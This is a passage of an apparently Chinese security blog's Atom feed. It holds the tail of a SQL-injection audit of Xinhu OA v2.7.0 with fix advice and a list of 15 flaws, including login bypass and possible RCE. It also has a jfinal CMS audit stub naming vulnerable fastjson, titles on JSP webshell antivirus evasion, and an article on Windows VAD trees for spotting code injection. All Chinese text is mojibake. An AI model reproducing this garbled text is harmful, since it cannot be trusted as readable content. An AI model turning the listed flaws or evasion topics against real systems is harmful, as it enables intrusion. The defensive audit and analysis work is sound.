id="3-filterstrå·²å¼ƒç”¨ä½†ä»åœ¨ä½¿ç”¨"><a href="#3-filterstrå·²å¼ƒç”¨ä½†ä»åœ¨ä½¿ç”¨" class="headerlink" title="3. filterstrå·²å¼ƒç”¨ä½†ä»åœ¨ä½¿ç”¨"></a>3. filterstrå·²å¼ƒç”¨ä½†ä»åœ¨ä½¿ç”¨</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mysqlClass.php</span></span><br><span class="line"><span class="comment">//å¼ƒç”¨è¿‡æ»¤</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filterstr</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... ä½†webmainAction.phpè¿˜åœ¨ç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="ğŸ’¡-ä¿®å¤å»ºè®®"><a href="#ğŸ’¡-ä¿®å¤å»ºè®®" class="headerlink" title="ğŸ’¡ ä¿®å¤å»ºè®®"></a>ğŸ’¡ ä¿®å¤å»ºè®®</h2><h3 id="1-ç«‹å³ä¿®å¤"><a href="#1-ç«‹å³ä¿®å¤" class="headerlink" title="1. ç«‹å³ä¿®å¤"></a>1. ç«‹å³ä¿®å¤</h3><p><strong>æ‰€æœ‰è§£å¯†æ“ä½œåå¿…é¡»è¿‡æ»¤</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä¿®å¤æ¨¡æ¿</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;param&#x27;</span>));  <span class="comment">// è§£å¯†</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;rock-&gt;<span class="title function_ invoke__">iconvsql</span>(<span class="variable">$param</span>);                  <span class="comment">// è¿‡æ»¤æ˜æ–‡</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">filterstr</span>(<span class="variable">$param</span>);                   <span class="comment">// äºŒæ¬¡è¿‡æ»¤</span></span><br><span class="line"><span class="comment">// æˆ–ä½¿ç”¨é¢„å¤„ç†</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM table WHERE field = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$param</span>]);</span><br></pre></td></tr></table></figure><h3 id="2-ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆPDOï¼‰"><a href="#2-ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆPDOï¼‰" class="headerlink" title="2. ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆPDOï¼‰"></a>2. ä½¿ç”¨é¢„å¤„ç†è¯­å¥ï¼ˆPDOï¼‰</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// æ¨èåšæ³•</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM admin WHERE mobile = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$shouji</span>]);</span><br></pre></td></tr></table></figure><h3 id="3-åºŸå¼ƒè‡ªå®šä¹‰åŠ å¯†ç”¨äºå®‰å…¨"><a href="#3-åºŸå¼ƒè‡ªå®šä¹‰åŠ å¯†ç”¨äºå®‰å…¨" class="headerlink" title="3. åºŸå¼ƒè‡ªå®šä¹‰åŠ å¯†ç”¨äºå®‰å…¨"></a>3. åºŸå¼ƒè‡ªå®šä¹‰åŠ å¯†ç”¨äºå®‰å…¨</h3><p><strong>åŠ å¯†ä¸æ˜¯å®‰å…¨æ§åˆ¶</strong>ï¼Œåº”è¯¥ï¼š</p><ul><li>ç§»é™¤æ‰€æœ‰â€å…ˆè¿‡æ»¤åŠ å¯†ä¸²â€çš„é€»è¾‘</li><li>ç»Ÿä¸€åœ¨è§£å¯†åç«‹å³è¿‡æ»¤</li><li>ä½¿ç”¨ç™½åå•éªŒè¯</li></ul><hr><h2 id="ğŸš¨-å½±å“èŒƒå›´"><a href="#ğŸš¨-å½±å“èŒƒå›´" class="headerlink" title="ğŸš¨ å½±å“èŒƒå›´"></a>ğŸš¨ å½±å“èŒƒå›´</h2><p><strong>æœ¬ç³»ç»Ÿå­˜åœ¨ 15ä¸ªçœŸæ­£çš„è§£å¯†å‚æ•°SQLæ³¨å…¥æ¼æ´</strong>ï¼Œå…¶ä¸­ï¼š</p><ul><li><strong>1ä¸ªä¸‡èƒ½SQLæ³¨å…¥</strong> (å¯è¯»å–ä»»æ„è¡¨)</li><li><strong>4ä¸ªæå±æ¼æ´</strong> (å¯ç›´æ¥æ‰§è¡ŒSQLæˆ–ç»•è¿‡ç™»å½•)</li><li><strong>8ä¸ªé«˜å±æ¼æ´</strong> (å¯æ³¨å…¥å„ç§æŸ¥è¯¢)</li><li><strong>1ä¸ªä»»æ„é…ç½®å†™å…¥</strong> (å¯èƒ½RCE)</li><li><strong>1ä¸ªè¿‡æ»¤é€»è¾‘é”™è¯¯</strong> (å…¨å±€å½±å“)</li></ul><p><strong>å‡ ä¹æ‰€æœ‰éœ€è¦è®¤è¯çš„åŠŸèƒ½éƒ½å¯èƒ½è¢«ç»•è¿‡ï¼</strong></p><hr><h2 id="ğŸ“-å¤‡æ³¨"><a href="#ğŸ“-å¤‡æ³¨" class="headerlink" title="ğŸ“ å¤‡æ³¨"></a>ğŸ“ å¤‡æ³¨</h2><p>æ„Ÿè°¢ä½ çš„æŒ‡æ­£ï¼é€šè¿‡ä½ æŒ‡å‡ºçš„ä¸¤ä¸ªæ¼æ´ï¼Œæˆ‘å­¦ä¼šäº†è¯†åˆ«**â€è§£å¯†åæœªè¿‡æ»¤ç›´æ¥æ‹¼æ¥â€**è¿™ä¸ªè‡´å‘½æ¨¡å¼ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†å…¨éƒ¨15ä¸ªæ¼æ´ã€‚</p><p>è¿™ä¸ªç³»ç»Ÿçš„æ ¸å¿ƒé—®é¢˜åœ¨äºï¼š</p><ol><li><strong>åŠ å¯†â‰ å®‰å…¨</strong> çš„é”™è¯¯è®¤çŸ¥</li><li><strong>è¿‡æ»¤æ—¶æœºé”™è¯¯</strong> (å…ˆè¿‡æ»¤å¯†æ–‡å†è§£å¯†)</li><li><strong>åºŸå¼ƒçš„è¿‡æ»¤å‡½æ•°ä»åœ¨ä½¿ç”¨</strong></li></ol><hr><p>ç”Ÿæˆæ—¶é—´: 2025-10-09 å®¡è®¡å·¥å…·: äººå·¥ä»£ç å®¡è®¡ + grepæœç´¢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA-v2-7-0-è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š&quot;&gt;&lt;a href=&quot;#ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA-v2-7-0-è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š&quot; class=&quot;headerlink&quot; title=&quot;ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA v2.7.0 - è§£å¯†SQLæ³¨å…¥</summary>
      
    
    
    
    <category term="WEBå®‰å…¨" scheme="https://250wuyifan.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WEBå®‰å…¨" scheme="https://250wuyifan.github.io/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>jfinal CMSä»£ç å®¡è®¡</title>
    <link href="https://250wuyifan.github.io/2025/10/06/jfinal%20CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://250wuyifan.github.io/2025/10/06/jfinal%20CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-10-06T12:24:25.000Z</published>
    <updated>2025-10-07T08:06:57.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ­å»º"><a href="#æ­å»º" class="headerlink" title="æ­å»º"></a>æ­å»º</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251006204921827.png" alt="image-20251006204921827"></p><h1 id="æœ‰æ¼æ´çš„ç»„ä»¶"><a href="#æœ‰æ¼æ´çš„ç»„ä»¶" class="headerlink" title="æœ‰æ¼æ´çš„ç»„ä»¶"></a>æœ‰æ¼æ´çš„ç»„ä»¶</h1><h2 id="fastjson-1-2-62-æé«˜é£é™©"><a href="#fastjson-1-2-62-æé«˜é£é™©" class="headerlink" title="fastjson 1.2.62 - æé«˜é£é™©"></a>fastjson 1.2.62 - æé«˜é£é™©</h2><p><a href="https://www.freebuf.com/articles/web/418403.html">https://www.freebuf.com/articles/web/418403.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ­å»º&quot;&gt;&lt;a href=&quot;#æ­å»º&quot; class=&quot;headerlink&quot; title=&quot;æ­å»º&quot;&gt;&lt;/a&gt;æ­å»º&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main</summary>
      
    
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>åˆæ¢JSPå…æ€</title>
    <link href="https://250wuyifan.github.io/2025/10/04/%E5%88%9D%E6%8E%A2JSP%E5%85%8D%E6%9D%80/"/>
    <id>https://250wuyifan.github.io/2025/10/04/%E5%88%9D%E6%8E%A2JSP%E5%85%8D%E6%9D%80/</id>
    <published>2025-10-04T14:58:48.000Z</published>
    <updated>2025-10-04T15:00:19.980Z</updated>
    
    
    
    
    
    <category term="å…æ€" scheme="https://250wuyifan.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>JSPå·¥ä½œåŸç†å’Œå…æ€</title>
    <link href="https://250wuyifan.github.io/2025/10/03/JSP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E5%85%8D%E6%9D%80/"/>
    <id>https://250wuyifan.github.io/2025/10/03/JSP%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%92%8C%E5%85%8D%E6%9D%80/</id>
    <published>2025-10-02T16:28:14.000Z</published>
    <updated>2025-10-02T16:28:14.141Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Java Agent</title>
    <link href="https://250wuyifan.github.io/2025/10/02/Java-Agent/"/>
    <id>https://250wuyifan.github.io/2025/10/02/Java-Agent/</id>
    <published>2025-10-02T06:18:48.000Z</published>
    <updated>2025-10-04T15:04:01.267Z</updated>
    
    
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>VADåœ¨è¿›ç¨‹ç¯¡æ”¹ä¸æŒ–ç©ºçš„ä¿æŠ¤</title>
    <link href="https://250wuyifan.github.io/2025/09/25/VAD%E5%9C%A8%E8%BF%9B%E7%A8%8B%E7%AF%A1%E6%94%B9%E4%B8%8E%E6%8C%96%E7%A9%BA%E7%9A%84%E4%BF%9D%E6%8A%A4/"/>
    <id>https://250wuyifan.github.io/2025/09/25/VAD%E5%9C%A8%E8%BF%9B%E7%A8%8B%E7%AF%A1%E6%94%B9%E4%B8%8E%E6%8C%96%E7%A9%BA%E7%9A%84%E4%BF%9D%E6%8A%A4/</id>
    <published>2025-09-25T13:32:54.000Z</published>
    <updated>2025-10-02T06:17:54.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="VADæ ‘"><a href="#VADæ ‘" class="headerlink" title="VADæ ‘"></a>VADæ ‘</h1><h2 id="1-ä»€ä¹ˆæ˜¯-VAD-æ ‘ï¼Ÿ"><a href="#1-ä»€ä¹ˆæ˜¯-VAD-æ ‘ï¼Ÿ" class="headerlink" title="1. ä»€ä¹ˆæ˜¯ VAD æ ‘ï¼Ÿ"></a>1. ä»€ä¹ˆæ˜¯ VAD æ ‘ï¼Ÿ</h2><p><strong>VAD</strong> çš„å…¨ç§°æ˜¯ <strong>Virtual Address Descriptor</strong>ã€‚ä½ å¯ä»¥æŠŠå®ƒæƒ³è±¡æˆè¿›ç¨‹çš„â€œå†…å­˜åœ°å›¾â€æˆ–â€œå†…å­˜ç›®å½•â€ã€‚</p><ul><li><strong>æ ¸å¿ƒæ€æƒ³</strong>ï¼šæ¯ä¸ª Windows ç”¨æˆ·è¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„ 4GBï¼ˆåœ¨ 32 ä½ç³»ç»Ÿä¸Šï¼‰æˆ– 256TBï¼ˆåœ¨ 64 ä½ç³»ç»Ÿä¸Šï¼‰çš„è™šæ‹Ÿåœ°å€ç©ºé—´ã€‚ä½†è¿›ç¨‹å¹¶ä¸ä¼šä½¿ç”¨æ‰€æœ‰è¿™äº›ç©ºé—´ã€‚VAD æ ‘å°±æ˜¯ä¸€ä¸ªå†…æ ¸æ•°æ®ç»“æ„ï¼Œå®ƒç”¨æ¥è®°å½•<strong>è¯¥è¿›ç¨‹å½“å‰å®é™…ä½¿ç”¨äº†å“ªäº›è™šæ‹Ÿå†…å­˜åŒºåŸŸ</strong>ï¼Œä»¥åŠè¿™äº›åŒºåŸŸçš„å„ç§å±æ€§ã€‚</li><li><strong>æ ‘å½¢ç»“æ„</strong>ï¼šVAD ä¸æ˜¯ç®€å•çš„åˆ—è¡¨ï¼Œè€Œæ˜¯ä¸€æ£µ<strong>è‡ªå¹³è¡¡çš„äºŒå‰æœç´¢æ ‘</strong>ï¼Œé€šå¸¸æ˜¯ <strong>AVL æ ‘</strong>ã€‚è¿™ä½¿å¾—æ“ä½œç³»ç»Ÿèƒ½å¤Ÿéå¸¸é«˜æ•ˆåœ°ï¼ˆæ—¶é—´å¤æ‚åº¦ä¸º O(log n)ï¼‰æŸ¥æ‰¾ã€æ’å…¥å’Œåˆ é™¤å†…å­˜åŒºåŸŸæè¿°ç¬¦ã€‚</li></ul><h2 id="2-VAD-èŠ‚ç‚¹é‡Œå­˜å‚¨äº†ä»€ä¹ˆä¿¡æ¯ï¼Ÿ"><a href="#2-VAD-èŠ‚ç‚¹é‡Œå­˜å‚¨äº†ä»€ä¹ˆä¿¡æ¯ï¼Ÿ" class="headerlink" title="2. VAD èŠ‚ç‚¹é‡Œå­˜å‚¨äº†ä»€ä¹ˆä¿¡æ¯ï¼Ÿ"></a>2. VAD èŠ‚ç‚¹é‡Œå­˜å‚¨äº†ä»€ä¹ˆä¿¡æ¯ï¼Ÿ</h2><p>æ¯ä¸ª VAD èŠ‚ç‚¹ä»£è¡¨è¿›ç¨‹åœ°å€ç©ºé—´ä¸­ä¸€ä¸ª<strong>è¿ç»­çš„</strong>ã€å…·æœ‰ç›¸åŒå†…å­˜å±æ€§çš„å†…å­˜åŒºåŸŸã€‚ä¸€ä¸ªèŠ‚ç‚¹é€šå¸¸åŒ…å«ä»¥ä¸‹å…³é”®ä¿¡æ¯ï¼š</p><ul><li><strong>èµ·å§‹åœ°å€å’Œç»“æŸåœ°å€</strong>ï¼šå®šä¹‰äº†è¿™ä¸ªå†…å­˜åŒºåŸŸçš„èŒƒå›´ã€‚</li><li><strong>å†…å­˜åˆ†é…ç±»å‹</strong>ï¼š<code>MEM_IMAGE</code>ï¼š è¯¥åŒºåŸŸæ˜ å°„äº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆå¦‚ .exe, .dllï¼‰çš„æŸä¸€éƒ¨åˆ†ã€‚<code>MEM_MAPPED</code>ï¼š è¯¥åŒºåŸŸæ˜ å°„äº†ä¸€ä¸ªæ•°æ®æ–‡ä»¶ï¼ˆé€šè¿‡å†…å­˜æ˜ å°„æ–‡ä»¶ï¼‰ã€‚<code>MEM_PRIVATE</code>ï¼š è¯¥åŒºåŸŸæ˜¯è¿›ç¨‹ç§æœ‰çš„ï¼ˆå¦‚å †ã€æ ˆã€åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼‰ã€‚</li><li><strong>å†…å­˜ä¿æŠ¤å±æ€§</strong>ï¼š<code>PAGE_READONLY</code>ï¼Œ <code>PAGE_READWRITE</code>ï¼Œ <code>PAGE_EXECUTE</code>ï¼Œ <code>PAGE_EXECUTE_READ</code>ç­‰ã€‚è¿™å†³å®šäº†è¯¥å†…å­˜åŒºåŸŸæ˜¯å¦å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œã€‚</li><li><strong>æ§åˆ¶åŒºåŸŸæŒ‡é’ˆ</strong>ï¼š è¿™æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>_CONTROL_AREA</code>ç»“æ„çš„æŒ‡é’ˆï¼Œè¯¥ç»“æ„è¿›ä¸€æ­¥æŒ‡å‘ä¸€ä¸ª <code>_SECTION_OBJECT</code>ï¼ˆèŠ‚å¯¹è±¡ï¼‰ã€‚è¿™å¯¹äºæ˜ å°„æ–‡ä»¶ï¼ˆ<code>MEM_IMAGE</code>å’Œ <code>MEM_MAPPED</code>ï¼‰è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå°†è™šæ‹Ÿå†…å­˜é¡µé¢ä¸ç‰©ç†æ–‡ä»¶ on disk å…³è”èµ·æ¥ã€‚<strong>ç®€å•æ¥è¯´</strong>ï¼šå¦‚æœæ˜¯æ˜ å°„æ–‡ä»¶ï¼ŒVAD èŠ‚ç‚¹é‡Œçš„ä¿¡æ¯å¯ä»¥å¸®ä½ æ‰¾åˆ°è¿™ä¸ªå†…å­˜åŒºåŸŸèƒŒåæ˜¯å“ªä¸ªç£ç›˜ä¸Šçš„æ–‡ä»¶ï¼Œä»¥åŠå…·ä½“æ˜¯æ–‡ä»¶çš„å“ªä¸€éƒ¨åˆ†ã€‚</li><li><strong>å…¶ä»–æ ‡å¿—</strong>ï¼š ä¾‹å¦‚ï¼Œè¯¥å†…å­˜åŒºåŸŸæ˜¯å¦è¢«æäº¤ã€æ˜¯å¦ä¸ºå®ˆæŠ¤é¡µé¢ç­‰ã€‚</li></ul><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20250925220447553.png" alt="image-20250925220447553"></p><h2 id="3-VAD-æ ‘çš„ä¸»è¦ä½œç”¨å’Œç›®çš„"><a href="#3-VAD-æ ‘çš„ä¸»è¦ä½œç”¨å’Œç›®çš„" class="headerlink" title="3. VAD æ ‘çš„ä¸»è¦ä½œç”¨å’Œç›®çš„"></a>3. VAD æ ‘çš„ä¸»è¦ä½œç”¨å’Œç›®çš„</h2><ol><li><strong>å†…å­˜è®¿é—®éªŒè¯</strong>ï¼š å½“è¿›ç¨‹å°è¯•è®¿é—®ä¸€ä¸ªå†…å­˜åœ°å€ï¼ˆä¾‹å¦‚ï¼Œè¯»å–ã€å†™å…¥æˆ–æ‰§è¡ŒæŒ‡ä»¤ï¼‰æ—¶ï¼Œå†…å­˜ç®¡ç†å™¨ä¼šæŸ¥è¯¢è¯¥è¿›ç¨‹çš„ VAD æ ‘ï¼Œä»¥ç¡®å®šè¯¥åœ°å€æ˜¯å¦åœ¨ä¸€ä¸ªå·²æäº¤çš„ã€å…·æœ‰ç›¸åº”æƒé™çš„å†…å­˜åŒºåŸŸå†…ã€‚å¦‚æœè®¿é—®æ— æ•ˆï¼ˆä¾‹å¦‚ï¼Œå†™å…¥ä¸€ä¸ªåªè¯»é¡µé¢ï¼Œæˆ–è®¿é—®ä¸€ä¸ªæœªåˆ†é…çš„åŒºåŸŸï¼‰ï¼Œåˆ™ä¼šå¼•å‘<strong>è®¿é—®è¿è§„å¼‚å¸¸</strong>ã€‚</li><li><strong>ç»“æ„åŒ–å­˜å‚¨</strong>ï¼š ä¸ºè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´æä¾›ä¸€ä¸ªç´§å‡‘çš„ã€é«˜æ•ˆçš„â€œç›®å½•â€ï¼Œé¿å…ä¸ºæ¯ä¸€ä¸ªå†…å­˜é¡µé¢éƒ½ä¿å­˜å…ƒæ•°æ®ï¼Œä»è€ŒèŠ‚çœèµ„æºã€‚</li><li><strong>æ”¯æŒå†…å­˜æ˜ å°„æ–‡ä»¶</strong>ï¼š VAD æ˜¯å®ç°å†…å­˜æ˜ å°„æ–‡ä»¶ï¼ˆ<code>CreateFileMapping</code>&#x2F; <code>MapViewOfFile</code>ï¼‰çš„åŸºç¡€ã€‚å®ƒè®°å½•äº†æ–‡ä»¶å“ªä¸€éƒ¨åˆ†è¢«æ˜ å°„åˆ°äº†è¿›ç¨‹åœ°å€ç©ºé—´çš„å“ªä¸ªä½ç½®ã€‚</li></ol><h2 id="4-ä¸ºä»€ä¹ˆ-VAD-æ ‘å¯¹å®‰å…¨å’Œåˆ†æå¦‚æ­¤é‡è¦ï¼Ÿ"><a href="#4-ä¸ºä»€ä¹ˆ-VAD-æ ‘å¯¹å®‰å…¨å’Œåˆ†æå¦‚æ­¤é‡è¦ï¼Ÿ" class="headerlink" title="4. ä¸ºä»€ä¹ˆ VAD æ ‘å¯¹å®‰å…¨å’Œåˆ†æå¦‚æ­¤é‡è¦ï¼Ÿ"></a>4. ä¸ºä»€ä¹ˆ VAD æ ‘å¯¹å®‰å…¨å’Œåˆ†æå¦‚æ­¤é‡è¦ï¼Ÿ</h2><p>VAD æ ‘æ˜¯æ¶æ„è½¯ä»¶åˆ†æå’Œæ•°å­—å–è¯çš„â€œé‡‘çŸ¿â€ï¼Œå› ä¸ºå®ƒæ­ç¤ºäº†è¿›ç¨‹è¡Œä¸ºçš„è®¸å¤šç§˜å¯†ï¼š</p><ul><li><strong>æ£€æµ‹éšè—æ¨¡å—&#x2F;DLL</strong>ï¼š æ¶æ„è½¯ä»¶å¯èƒ½ä¼šä½¿ç”¨ä¸€ç§å«åšâ€œåå°„å¼ DLL æ³¨å…¥â€æˆ–â€œæ¨¡å—é•‚ç©ºâ€çš„æŠ€æœ¯ï¼Œå°†æ¶æ„ DLL åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œä½†ç»•è¿‡æ ‡å‡†çš„ Windows æ¨¡å—åˆ—è¡¨ï¼ˆå¦‚ PEB ä¸­çš„æ¨¡å—é“¾è¡¨ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ç§æ³¨å…¥æ–¹å¼ä»ç„¶éœ€è¦åœ¨è¿›ç¨‹åœ°å€ç©ºé—´ä¸­åˆ†é…å†…å­˜å¹¶è®¾ç½®æƒé™ï¼Œå› æ­¤<strong>å¿…å®šä¼šåœ¨ VAD æ ‘ä¸­ç•™ä¸‹è®°å½•</strong>ã€‚åˆ†æ VAD æ ‘å¯ä»¥å‘ç°è¿™äº›éšè—çš„æ¨¡å—ã€‚</li><li><strong>æ£€æµ‹ä»£ç æ³¨å…¥</strong>ï¼š å½“æ¶æ„è½¯ä»¶å°†ä»£ç æ³¨å…¥åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ï¼ˆå¦‚ <code>explorer.exe</code>ï¼‰æ—¶ï¼Œå®ƒå¿…é¡»åœ¨è¯¥è¿›ç¨‹ä¸­åˆ†é…å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œçš„å†…å­˜ã€‚è¿™ä¼šåœ¨ç›®æ ‡è¿›ç¨‹çš„ VAD æ ‘ä¸­åˆ›å»ºä¸€ä¸ªå…·æœ‰ <code>PAGE_EXECUTE_READWRITE</code>å±æ€§çš„ <code>MEM_PRIVATE</code>åŒºåŸŸï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å¯ç–‘çš„è¿¹è±¡ï¼ˆå› ä¸ºæ­£å¸¸ç¨‹åºå¾ˆå°‘éœ€è¦ç§æœ‰çš„ã€å¯æ‰§è¡Œä¸”å¯å†™çš„å†…å­˜ï¼‰ã€‚</li><li><strong>æå–æ˜ å°„æ–‡ä»¶</strong>ï¼š åœ¨å–è¯ä¸­ï¼Œå¯ä»¥ä» VAD èŠ‚ç‚¹ä¸­æå–å‡ºå·²æ˜ å°„çš„æ–‡ä»¶å†…å®¹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªæ¶æ„è½¯ä»¶æ˜ å°„äº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åˆ°å†…å­˜ä¸­ä½†å¹¶æœªæ‰§è¡Œï¼Œä¼ ç»Ÿçš„åŠ¨æ€åˆ†æå·¥å…·å¯èƒ½æ— æ³•å‘ç°å®ƒï¼Œä½†é€šè¿‡è½¬å‚¨ VAD æ ‘ä¸­å¯¹åº”çš„å†…å­˜åŒºåŸŸï¼Œå¯ä»¥æ¢å¤å‡ºå®Œæ•´çš„æ–‡ä»¶ã€‚</li><li><strong>äº†è§£è¿›ç¨‹è¡Œä¸º</strong>ï¼š é€šè¿‡æŸ¥çœ‹ VAD æ ‘ï¼Œå¯ä»¥äº†è§£ä¸€ä¸ªè¿›ç¨‹åŠ è½½äº†å“ªäº› DLLã€æ˜ å°„äº†å“ªäº›æ•°æ®æ–‡ä»¶ã€å®ƒçš„å †æ ˆåœ¨å“ªé‡Œç­‰ç­‰ï¼Œä»è€Œå…¨é¢äº†è§£å…¶å†…å­˜å¸ƒå±€å’Œè¡Œä¸ºã€‚</li></ul><h2 id="å¯è§†åŒ–ç¤ºä¾‹"><a href="#å¯è§†åŒ–ç¤ºä¾‹" class="headerlink" title="å¯è§†åŒ–ç¤ºä¾‹"></a>å¯è§†åŒ–ç¤ºä¾‹</h2><p>æƒ³è±¡ä¸€ä¸ªè¿›ç¨‹çš„ VAD æ ‘å¯èƒ½é•¿è¿™æ ·ï¼š</p><p>å¤åˆ¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[VAD #2: 0x00010000 - 0x0001FFFF] (Image: notepad.exe, .text section, RX)</span><br><span class="line">       /</span><br><span class="line">[VAD Root]</span><br><span class="line">       \</span><br><span class="line">        [VAD #3: 0x00020000 - 0x0002FFFF] (Image: notepad.exe, .data section, RW)</span><br><span class="line">        \</span><br><span class="line">         [VAD #5: 0x00100000 - 0x0010FFFF] (Private Heap, RW)</span><br><span class="line">         \</span><br><span class="line">          [VAD #4: 0x00200000 - 0x0020FFFF] (Image: kernel32.dll, .text section, RX)</span><br></pre></td></tr></table></figure><h2 id="å¦‚ä½•æŸ¥çœ‹-VAD-æ ‘ï¼Ÿ"><a href="#å¦‚ä½•æŸ¥çœ‹-VAD-æ ‘ï¼Ÿ" class="headerlink" title="å¦‚ä½•æŸ¥çœ‹ VAD æ ‘ï¼Ÿ"></a>å¦‚ä½•æŸ¥çœ‹ VAD æ ‘ï¼Ÿ</h2><p>æœ€å¸¸ç”¨çš„å·¥å…·æ˜¯ <strong>WinDbg</strong>ï¼ˆå¾®è½¯å®˜æ–¹è°ƒè¯•å™¨ï¼‰åŠå…¶ <code>!vad</code>æ‰©å±•å‘½ä»¤ã€‚</p><ol><li>åœ¨ WinDbg ä¸­é™„åŠ åˆ°ä¸€ä¸ªè¿›ç¨‹ã€‚</li><li>è¾“å…¥å‘½ä»¤ <code>!vad</code>ã€‚</li><li>å®ƒä¼šä»¥æ–‡æœ¬å½¢å¼æ‰“å°å‡ºè¿›ç¨‹çš„ VAD æ ‘ï¼Œæ˜¾ç¤ºæ¯ä¸ªèŠ‚ç‚¹çš„åœ°å€èŒƒå›´ã€ä¿æŠ¤å±æ€§ã€ç±»å‹ç­‰ä¿¡æ¯ã€‚</li></ol><p>å•†ä¸šå†…å­˜å–è¯å·¥å…·å¦‚ <strong>Volatility</strong> ä¹Ÿå†…ç½®äº†å¼ºå¤§çš„ VAD è§£æåŠŸèƒ½ï¼Œå¯ä»¥éå¸¸ç›´è§‚åœ°å±•ç¤ºå’Œåˆ†æ VAD æ ‘ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p><strong>VAD æ ‘æ˜¯ Windows å†…æ 